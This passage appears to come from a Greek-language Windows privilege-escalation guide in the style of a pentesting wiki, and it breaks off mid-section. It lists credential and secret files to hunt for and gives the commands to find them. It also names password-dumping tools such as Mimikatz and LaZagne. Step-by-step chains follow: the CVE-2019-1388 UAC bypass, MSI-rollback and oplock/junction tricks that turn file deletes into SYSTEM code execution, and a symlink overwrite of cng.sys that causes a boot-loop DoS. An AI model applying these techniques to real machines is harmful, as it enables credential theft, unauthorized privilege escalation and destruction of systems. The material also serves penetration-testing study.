php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Αναζητήστε σε όλα τα προτεινόμενα αρχεία:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Θα πρέπει επίσης να ελέγξετε τον Κάδο για να αναζητήσετε διαπιστευτήρια μέσα σε αυτόν

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά registry keys με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή κλειδιών openssh από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό Browsers

Θα πρέπει να ελέγξετε για dbs όπου αποθηκεύονται passwords από **Chrome ή Firefox**.\
Επίσης, ελέγξτε το history, τα bookmarks και τα favourites των browsers, καθώς μπορεί να είναι αποθηκευμένα εκεί κάποια **passwords**.

Tools για την εξαγωγή passwords από browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows, η οποία επιτρέπει τη **διαεπικοινωνία** μεταξύ software components διαφορετικών γλωσσών. Κάθε COM component **ταυτοποιείται μέσω ενός class ID (CLSID)** και κάθε component εκθέτει λειτουργικότητα μέσω ενός ή περισσότερων interfaces, τα οποία ταυτοποιούνται μέσω interface IDs (IIDs).

Οι COM classes και interfaces ορίζονται στο registry, αντίστοιχα, κάτω από τα **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface**. Αυτό το registry δημιουργείται με τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το child registry **InProcServer32**, το οποίο περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια value που ονομάζεται **ThreadingModel**, η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ή Multi) ή **Neutral** (Thread Neutral).

![Ιστορικό Browsers - COM DLL Overwriting: Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το child registry InProcServer32, το οποίο περιέχει μια default value που δείχνει σε ένα DLL και μια value...](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLLs** που πρόκειται να εκτελεστούν, θα μπορούσατε να κάνετε **escalate privileges**, εάν αυτό το DLL πρόκειται να εκτελεστεί από διαφορετικό user.

Για να μάθετε πώς οι attackers χρησιμοποιούν το COM Hijacking ως persistence mechanism, ελέγξτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Αναζήτηση Generic Passwords σε αρχεία και registry**

**Αναζήτηση περιεχομένου αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση αρχείου με συγκεκριμένο όνομα αρχείου**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζητήστε στο registry ονόματα κλειδιών και κωδικούς πρόσβασης**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν κωδικούς πρόσβασης

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα msf** plugin που έχω δημιουργήσει για να **εκτελεί αυτόματα κάθε metasploit POST module που αναζητά credentials** μέσα στο victim.\
Το [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν τους κωδικούς πρόσβασης που αναφέρονται σε αυτήν τη σελίδα.\
Το [**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** διαφόρων εργαλείων που αποθηκεύουν αυτά τα δεδομένα σε clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) **με πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά δικαιώματα, αλλά κληρονομώντας όλα τα ανοιχτά handles της κύριας διεργασίας**.\
Στη συνέχεια, αν έχετε **πλήρη πρόσβαση στη διεργασία με τα χαμηλά δικαιώματα**, μπορείτε να αποκτήσετε το **ανοιχτό handle προς την privileged διεργασία που δημιουργήθηκε** με `OpenProcess()` και να **κάνετε inject ένα shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσετε και να εκμεταλλευτείτε αυτή την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτή την **άλλη ανάρτηση για μια πληρέστερη εξήγηση σχετικά με το πώς να ελέγξετε και να κάνετε abuse περισσότερα ανοιχτά handles διεργασιών και threads που κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα τμήματα shared memory, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία μεταξύ διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, η οποία επιτρέπει σε άσχετες μεταξύ τους διεργασίες να μοιράζονται δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν τα δεδομένα αποστέλλονται μέσω ενός pipe από έναν **client**, ο **server** που δημιούργησε το pipe έχει τη δυνατότητα να **υιοθετήσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Ο εντοπισμός μιας **privileged διεργασίας** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε παρέχει την ευκαιρία να **αποκτήσετε υψηλότερα δικαιώματα**, υιοθετώντας την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδράσει με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, χρήσιμοι οδηγοί υπάρχουν [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το παρακάτω εργαλείο επιτρέπει την **παρεμβολή σε μια επικοινωνία named pipe με ένα εργαλείο όπως το burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την καταχώριση και προβολή όλων των pipes για την εύρεση privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv) σε λειτουργία server εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος authenticated client μπορεί να κάνει abuse τη βασισμένη σε mailslot διαδρομή ασύγχρονων events, ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετη **εγγραφή 4-byte** σε οποιοδήποτε υπάρχον αρχείο στο οποίο μπορεί να γράψει το `NETWORK SERVICE`, και στη συνέχεια να αποκτήσει δικαιώματα Telephony admin και να φορτώσει ένα αυθαίρετο DLL ως η υπηρεσία. Πλήρης ροή:

- `ClientAttach` με το `pszDomainUser` να έχει οριστεί σε μια υπάρχουσα διαδρομή με δικαιώματα εγγραφής → η υπηρεσία την ανοίγει μέσω του `CreateFileW(..., OPEN_EXISTING)` και τη χρησιμοποιεί για ασύγχρονες εγγραφές events.
- Κάθε event γράφει το ελεγχόμενο από τον attacker `InitContext` από το `Initialize` σε αυτό το handle. Κάντε register μια line app με το `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε το `TRequestMakeCall` (`Req_Func 121`), ανακτήστε το μέσω του `GetAsyncEvents` (`Req_Func 0`) και, στη συνέχεια, κάντε unregister/shutdown για να επαναλάβετε deterministic εγγραφές.
- Προσθέστε τον εαυτό σας στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, επανασυνδεθείτε και, στη συνέχεια, καλέστε το `GetUIDllName` με μια αυθαίρετη διαδρομή DLL για να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### File Extensions that could execute stuff in Windows

Ρίξτε μια ματιά στη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Τα clickable Markdown links που προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε registered scheme) και να εκτελέσουν αρχεία που ελέγχει ο attacker ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Όταν αποκτάτε shell ως χρήστης, ενδέχεται να εκτελούνται scheduled tasks ή άλλες διεργασίες που **περνούν credentials στη command line**. Το παρακάτω script καταγράφει τις command lines των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών πρόσβασης από processes

## Από χρήστη με χαμηλά δικαιώματα σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω console ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατή η εκτέλεση ενός terminal ή οποιουδήποτε άλλου process ως "NT\AUTHORITY SYSTEM" από έναν μη προνομιούχο χρήστη.

Αυτό καθιστά δυνατή την κλιμάκωση δικαιωμάτων και την ταυτόχρονη παράκαμψη του UAC, εκμεταλλευόμενοι την ίδια ευπάθεια. Επιπλέον, δεν απαιτείται η εγκατάσταση οποιουδήποτε στοιχείου και το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδομένο από τη Microsoft.

Μερικά από τα επηρεαζόμενα συστήματα είναι τα εξής:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για την εκμετάλλευση αυτής της ευπάθειας, είναι απαραίτητο να εκτελεστούν τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Έχετε όλα τα απαραίτητα αρχεία και τις πληροφορίες στο ακόλουθο GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να **μάθετε σχετικά με τα Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια, **διαβάστε αυτό για να μάθετε σχετικά με το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Από Arbitrary Folder Delete/Move/Rename σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτό το blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), με exploit code [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Η επίθεση βασίζεται στην κατάχρηση της δυνατότητας rollback του Windows Installer, ώστε να αντικατασταθούν legitimate αρχεία με malicious αρχεία κατά τη διαδικασία απεγκατάστασης. Για αυτό, ο attacker πρέπει να δημιουργήσει έναν **malicious MSI installer**, ο οποίος θα χρησιμοποιηθεί για να γίνει hijack του φακέλου `C:\Config.Msi`. Ο φάκελος αυτός θα χρησιμοποιηθεί αργότερα από το Windows Installer για την αποθήκευση rollback αρχείων κατά την απεγκατάσταση άλλων MSI packages, όπου τα rollback αρχεία θα έχουν τροποποιηθεί ώστε να περιέχουν το malicious payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Προετοιμασία για το Hijack (αφήστε το `C:\Config.Msi` κενό)**

- Step 1: Εγκατάσταση του MSI
- Δημιουργήστε ένα `.msi` που εγκαθιστά ένα harmless αρχείο (π.χ. `dummy.txt`) σε έναν writable φάκελο (`TARGETDIR`).
- Σημειώστε τον installer ως **"UAC Compliant"**, ώστε ένας **non-admin user** να μπορεί να τον εκτελέσει.
- Κρατήστε ένα **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Step 2: Έναρξη απεγκατάστασης
- Απεγκαταστήστε το ίδιο `.msi`.
- Η διαδικασία απεγκατάστασης ξεκινά να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (rollback backups).
- Κάντε **poll το ανοιχτό file handle** χρησιμοποιώντας το `GetFinalPathNameByHandle`, ώστε να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
- Κάνει signal όταν έχει γραφτεί το `.rbf`.
- Στη συνέχεια **περιμένει** ένα άλλο event πριν συνεχίσει την απεγκατάσταση.

- Step 4: Αποκλεισμός διαγραφής του `.rbf`
- Όταν λάβετε το signal, **ανοίξτε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — αυτό **το εμποδίζει να διαγραφεί**.
- Στη συνέχεια, κάντε signal πίσω, ώστε να ολοκληρωθεί η απεγκατάσταση.
- Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf` και, επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, το `C:\Config.Msi` **δεν αφαιρείται**.

- Step 5: Μη αυτόματη διαγραφή του `.rbf`
- Εσείς (ο attacker) διαγράφετε μη αυτόματα το αρχείο `.rbf`.
- Τώρα το `C:\Config.Msi` είναι κενό και έτοιμο για hijack.

> Σε αυτό το σημείο, **ενεργοποιήστε το SYSTEM-level arbitrary folder delete vulnerability** για να διαγράψετε το `C:\Config.Msi`.

2. **Stage 2 – Αντικατάσταση των Rollback Scripts με Malicious Scripts**

- Step 6: Αναδημιουργία του `C:\Config.Msi` με Weak ACLs
- Αναδημιουργήστε μόνοι σας τον φάκελο `C:\Config.Msi`.
- Ορίστε **weak DACLs** (π.χ. Everyone:F) και **κρατήστε ένα handle ανοιχτό** με `WRITE_DAC`.

- Step 7: Εκτέλεση ενός ακόμη Install
- Εγκαταστήστε ξανά το `.msi`, με:
- `TARGETDIR`: Writable location.
- `ERROROUT`: Μια μεταβλητή που προκαλεί forced failure.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει τα `.rbs` και `.rbf`.

- Step 8: Παρακολούθηση για `.rbs`
- Χρησιμοποιήστε το `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Καταγράψτε το filename του.

- Step 9: Sync πριν από το Rollback
- Το `.msi` περιέχει ένα **custom install action (`SyncBeforeRollback`)** που:
- Κάνει signal σε ένα event όταν δημιουργηθεί το `.rbs`.
- Στη συνέχεια **περιμένει** πριν συνεχίσει.

- Step 10: Επαναφορά του Weak ACL
- Αφού λάβετε το event `.rbs created`:
- Το Windows Installer **εφαρμόζει ξανά strong ACLs** στο `C:\Config.Msi`.
- Όμως, επειδή εξακολουθείτε να έχετε ένα handle με `WRITE_DAC`, μπορείτε να **εφαρμόσετε ξανά weak ACLs**.

> Τα ACLs **επιβάλλονται μόνο κατά το άνοιγμα ενός handle**, επομένως μπορείτε ακόμα να γράψετε στον φάκελο.

- Step 11: Απόθεση Fake `.rbs` και `.rbf`
- Αντικαταστήστε το αρχείο `.rbs` με ένα **fake rollback script** που λέει στα Windows να:
- Επαναφέρουν το αρχείο `.rbf` (malicious DLL) σε μια **privileged location** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Αποθέστε το fake `.rbf`, το οποίο περιέχει ένα **malicious SYSTEM-level payload DLL**.

- Step 12: Ενεργοποίηση του Rollback
- Κάντε signal στο sync event, ώστε ο installer να συνεχίσει.
- Ένα **type 19 custom action (`ErrorOut`)** έχει ρυθμιστεί ώστε να **αποτυγχάνει σκόπιμα η εγκατάσταση** σε ένα γνωστό σημείο.
- Αυτό προκαλεί την **έναρξη του rollback**.

- Step 13: Το SYSTEM εγκαθιστά το DLL σας
- Το Windows Installer:
- Διαβάζει το malicious `.rbs`.
- Αντιγράφει το `.rbf` DLL στη target location.
- Τώρα έχετε το **malicious DLL σας σε ένα SYSTEM-loaded path**.

- Final Step: Εκτέλεση SYSTEM Code
- Εκτελέστε ένα trusted **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL που κάνατε hijack.
- **Boom**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### Από Arbitrary File Delete/Move/Rename σε SYSTEM EoP

Η βασική τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείτε να διαγράψετε έναν **ολόκληρο φάκελο** (π.χ. `C:\Config.Msi`). Τι γίνεται όμως αν το vulnerability σας επιτρέπει μόνο **arbitrary file deletion**;

Θα μπορούσατε να εκμεταλλευτείτε τα **NTFS internals**: κάθε φάκελος διαθέτει ένα hidden alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του folder.

Επομένως, αν **διαγράψετε το stream `::$INDEX_ALLOCATION`** ενός folder, το NTFS **αφαιρεί ολόκληρο το folder** από το filesystem.

Μπορείτε να το κάνετε χρησιμοποιώντας τυπικά API διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρόλο που καλείτε ένα API διαγραφής *αρχείου*, **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σας δεν σας επιτρέπει να διαγράψετε αυθαίρετα αρχεία/φακέλους, αλλά **επιτρέπει τη διαγραφή των *περιεχομένων* ενός φακέλου που ελέγχεται από τον attacker**;

1. Βήμα 1: Ρυθμίστε έναν παραπλανητικό φάκελο και αρχείο
- Δημιουργήστε: `C:\temp\folder1`
- Μέσα σε αυτόν: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθετήστε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια privileged διεργασία προσπαθεί να διαγράψει το `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Ενεργοποίηση διεργασίας SYSTEM (π.χ. `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ. `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, ενεργοποιείται το **oplock** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο callback του oplock – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνηση του `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να διακοπεί το oplock.
- Μην διαγράψετε απευθείας το `file1.txt` — αυτό θα απελευθέρωνε πρόωρα το oplock.

- Επιλογή B: Μετατροπή του `folder1` σε **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργία ενός **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει την εσωτερική ροή NTFS που αποθηκεύει τα μεταδεδομένα του φακέλου — η διαγραφή της διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από τη δημιουργία αυθαίρετου φακέλου σε μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμα κι αν **δεν μπορείτε να γράψετε αρχεία** ή να **ορίσετε αδύναμα permissions**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή αντιστοιχεί κανονικά στον kernel-mode driver `cng.sys`.
- Αν την **προδημιουργήσετε ως φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Εντοπίζουν τον φάκελο, **αποτυγχάνουν να επιλύσουν τον πραγματικό driver** και **προκαλούν crash ή διακόπτουν την εκκίνηση**.
- Δεν υπάρχει **fallback** ούτε **recovery** χωρίς εξωτερική παρέμβαση (π.χ. boot repair ή πρόσβαση στον δίσκο).

### Από privileged log/backup paths + OM symlinks σε arbitrary file overwrite / boot DoS

Όταν μια **privileged service** γράφει logs/exports σε μια διαδρομή που διαβάζεται από ένα **writable config**, ανακατευθύνετε αυτήν τη διαδρομή με **Object Manager symlinks + NTFS mount points**, ώστε να μετατρέψετε την privileged εγγραφή σε arbitrary overwrite (ακόμη και **χωρίς** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Απαιτήσεις**
- Το config που αποθηκεύει τη διαδρομή-στόχο πρέπει να είναι writable από τον attacker (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς `\RPC Control` και OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Μια privileged operation που γράφει σε αυτήν τη διαδρομή (log, export, report).

**Παράδειγμα chain**
1. Διαβάστε το config για να ανακτήσετε τον privileged προορισμό του log, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε το privileged component να γράψει στο log (π.χ. ο admin ενεργοποιεί το "send test SMS"). Η εγγραφή πλέον καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Ελέγξτε τον overwritten στόχο (hex/PE parser) για να επιβεβαιώσετε την αλλοίωση· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν την παραποιημένη διαδρομή του driver → **boot loop DoS**. Αυτό γενικεύεται επίσης σε οποιοδήποτε protected αρχείο που μια privileged υπηρεσία θα ανοίξει για εγγραφή.

> Το `cng.sys` φορτώνεται κανονικά από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει αντίγραφο στο `C:\Windows\System32\cng.sys`, μπορεί να δοκιμαστεί πρώτο, καθιστώντας το αξιόπιστο sink για DoS μέσω corrupted data.



## **Από High Integrity σε System**

### **Νέα υπηρεσία**

Αν εκτελείτε ήδη μια διεργασία High Integrity, το **path προς SYSTEM** μπορεί να είναι εύκολο, απλώς **δημιουργώντας και εκτελώντας μια νέα υπηρεσία**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Όταν δημιουργείτε ένα service binary, βεβαιωθείτε ότι είναι ένα έγκυρο service ή ότι το binary εκτελεί γρήγορα τις απαραίτητες ενέργειες, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια διεργασία High Integrity μπορείτε να προσπαθήσετε να **ενεργοποιήσετε τις καταχωρίσεις registry του AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
